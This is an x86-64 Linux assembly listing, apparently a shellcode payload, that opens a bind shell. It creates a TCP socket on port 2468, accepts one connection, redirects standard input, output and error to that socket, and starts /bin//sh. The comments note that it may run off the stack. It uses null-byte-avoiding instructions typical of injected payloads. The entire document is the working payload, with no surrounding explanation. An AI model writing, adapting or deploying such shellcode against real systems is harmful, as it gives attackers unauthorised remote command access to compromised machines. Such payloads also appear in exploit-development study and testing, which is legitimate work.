section .text
	global _start

_start:
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx
; Create socket fd
	; move the stack pointer out of the way in case the shellcode is executing off the stack
	sub sp, 0x0202
	; create a stack frame
	mov rbp, rsp
	sub sp, 0x0202
	; socket syscall number
	mov al, 41
	; family: AF_INET
	mov dil, 2
	; type: SOCK_STREAM
	inc sil
	; protocol: IPPROTO_TCP
	mov dl, 6
	; socket syscall
	syscall

	; save the socket fd
	mov [rbp + 0x04], rax

; create a sockaddr_in struct on the stack
	; family 
	mov dl, 2
	mov word [rbp + 0x08], dx
	; port number
	mov dx, 2468
	xchg dh, dl
	mov word [rbp + 0x0a], dx
	; addr
	xor rax, rax
	mov dword [rbp + 0xc], eax

; bind the port
	; bind syscall number
	xor rax, rax
	mov al, 49
	; fd
	mov edi, dword [rbp + 0x04]
	; sockaddr_in struct
	lea rsi, [rbp + 0x08]
	; sockaddr_in struct size
	xor rdx, rdx
	mov dl, 16
	; bind syscall
	syscall

; set the port to listen
	; listen syscall number
	mov al, 50
	; fd
	mov edi, dword [rbp + 0x04]
	; backlog
	xor rsi, rsi
	inc rsi
	; listen syscall
	syscall

; accept an incoming connection
	; accept syscall number
	mov al, 43
	; fd
	mov edi, dword [rbp + 0x04]
	; sockaddr_in struct
	xor rsi, rsi
	; sockaddr_in struct size
	xor rdx, rdx
	; accept syscall
	syscall
	; replace with the new fd and close the previous one
	push rax
	; close syscall number
	xor rax, rax
	mov al, 3
	; fd
	mov edi, dword [rbp + 0x04]
	syscall
	pop rax
	mov [rbp + 0x04], rax

; dup stdin/out/error to the socket
	; stdin
	; dup2 syscall
	mov al, 33
	; oldfd
	mov edi, dword [rbp + 0x04]
	; newfd
	xor rsi, rsi
	; dup2 syscall
	syscall

	xor rax, rax
	mov al, 33
	inc rsi
	syscall

	xor rax, rax
	mov al, 33
	inc rsi
	syscall

; execve /bin//sh to start the shell
	; execve syscall number
	mov al, 59

	; env
	xor rdx, rdx

	; argv
	xor rsi, rsi

	;filename
	push rsi 
	mov rdi, 0x68732f2f6e69622f
	push rdi
	lea rdi, [rsp]

	; execve syscall
	syscall
; cleanly close the socket after execution
	xor rax, rax
	mov al, 3
	mov rdi, [rbp + 0x04]
	syscall
